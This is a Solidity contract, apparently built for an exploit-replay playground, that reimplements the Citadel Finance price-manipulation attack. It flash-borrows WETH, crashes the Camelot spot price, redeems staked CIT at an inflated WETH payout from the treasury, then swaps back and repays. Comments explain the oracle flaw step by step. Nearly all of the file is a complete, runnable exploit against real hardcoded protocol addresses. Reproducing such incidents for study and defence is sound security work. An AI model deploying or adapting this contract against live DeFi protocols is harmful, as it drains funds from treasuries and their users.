// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-01-CitadelFinance).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the Uniswap-V3 flash callback `uniswapV3FlashCallback` lives on the test
// itself, and `address(this)` acts as both attacker and staker throughout),
// so there is no standalone contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack (testExploit -> run(),
// uniswapV3FlashCallback + WETHToUSDC/USDCToWETH unchanged) so the playground
// can deploy it and record run(). Logic and constants are copied verbatim
// from test/CitadelFinance_exp.sol.
//
// Root cause: CitadelRedeem.redeem() prices the fixed-rate WETH payout by
// asking a live Camelot WETH/USDC pair for the spot exchange rate via
// camelotRouter.getAmountsOut(...). That spot rate is trivially manipulable
// within a single transaction: the attacker flash-borrows WETH, dumps it into
// the Camelot pair to crash WETH's price, then redeems a small vested CIT
// position - the treasury pays out a WETH amount computed at the manipulated
// (artificially cheap) price, wildly overpaying for the CIT surrendered. The
// attacker swaps back to restore the pool and repays the flash loan, keeping
// the surplus WETH as profit.

interface ICitadelStaking {
    function redeemCalculator(address user) external view returns (uint256[2][2] memory);
    function getCITInUSDAllFixedRates(address user, uint256 amount) external view returns (uint256);
    function deposit(address token, uint256 amount, uint8 rate) external;
    function getTotalTokenStakedForUser(address user, uint8 rate, address token) external view returns (uint256);
}

interface ICitadelRedeem {
    function redeem(uint256 underlying, uint256 token, uint256 amount, uint8 rate) external;
}

interface ICamelotRouter {
    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        address referrer,
        uint256 deadline
    ) external;
}

interface IUniV3FlashPool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
}

contract CitadelDrain {
    ICitadelStaking constant CitadelStaking = ICitadelStaking(0x5e93c07a22111b327EE0EaEC64028064448ae848);
    ICitadelRedeem constant CitadelRedeem = ICitadelRedeem(0x34b666992fcCe34669940ab6B017fE11e5750799);
    IUniV3FlashPool constant WETH_USDC = IUniV3FlashPool(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
    IERC20 constant WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 constant USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 constant CIT = IERC20(0x43cF1856606df2CB22AEdbA1a3e23725f1594E81);
    ICamelotRouter constant CamelotRouter = ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);
    address constant citadelTreasury = 0x5ed32847e33844155c18944Ae84459404e432620;

    // Step 0 (pre-attack, mirrors testExploit() lines before "Start attack"):
    // stake 2,653 CIT at the fixed rate so a slice vests and becomes
    // redeemable once time is warped forward by the harness (setup block).
    function stake() external {
        uint256 bal = CIT.balanceOf(address(this));
        CIT.approve(address(CitadelStaking), bal);
        CitadelStaking.deposit(address(CIT), bal, 1);
    }

    // Step 1: take a 4,500 WETH flash loan from the Uniswap-V3 WETH/USDC
    // pool. The pool calls back uniswapV3FlashCallback(...) once the WETH
    // is already here.
    function run() external {
        uint256 wethAmount = 4500 * 1e18;
        bytes memory data = abi.encode(wethAmount);
        WETH_USDC.flash(address(this), wethAmount, 0, data);
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256, bytes calldata data) external {
        uint256 borrowedWETHAmount = abi.decode(data, (uint256));
        WETH.approve(address(CamelotRouter), borrowedWETHAmount);

        // Step 2: dump the flash-borrowed WETH into the Camelot WETH/USDC
        // pair, crashing WETH's price there (this is the pool CitadelRedeem
        // reads its spot rate from).
        WETHToUSDC(borrowedWETHAmount);

        uint256 amountIn = WETH.balanceOf(citadelTreasury);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(USDC);

        uint256[] memory amounts = CamelotRouter.getAmountsOut(amountIn, path);
        uint256 amountOutUSDC = amounts[1];

        uint256 amountCITAvailable =
            CitadelStaking.redeemCalculator(address(this))[0][1] + CitadelStaking.redeemCalculator(address(this))[1][1];

        uint256 citInUSD = CitadelStaking.getCITInUSDAllFixedRates(address(this), amountCITAvailable);

        uint256 redeemAmount = amountCITAvailable;
        if (amountOutUSDC < citInUSD / 10 ** 12) {
            redeemAmount = redeemAmount / 3;
        }

        // Step 3: THE BUG. redeem() prices the WETH payout for this CIT
        // slice off the just-manipulated Camelot spot rate, so the treasury
        // sends back a hugely inflated amount of WETH for a small, honestly
        // priced CIT position.
        CitadelRedeem.redeem(1, 0, redeemAmount, 1);

        USDC.approve(address(CamelotRouter), USDC.balanceOf(address(this)));

        // Step 4: swap the USDC received from the initial dump back into
        // WETH, restoring the pool and recovering most of the flash principal.
        USDCToWETH(USDC.balanceOf(address(this)));

        // Step 5: repay the flash loan + fee. Everything left over (plus the
        // manipulated redeem payout) stays in this contract as profit.
        WETH.transfer(address(WETH_USDC), borrowedWETHAmount + fee0);
    }

    function WETHToUSDC(uint256 amount) private {
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(USDC);
        CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), address(0), block.timestamp + 1000
        );
    }

    function USDCToWETH(uint256 amount) private {
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WETH);
        CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), address(0), block.timestamp + 1000
        );
    }
}
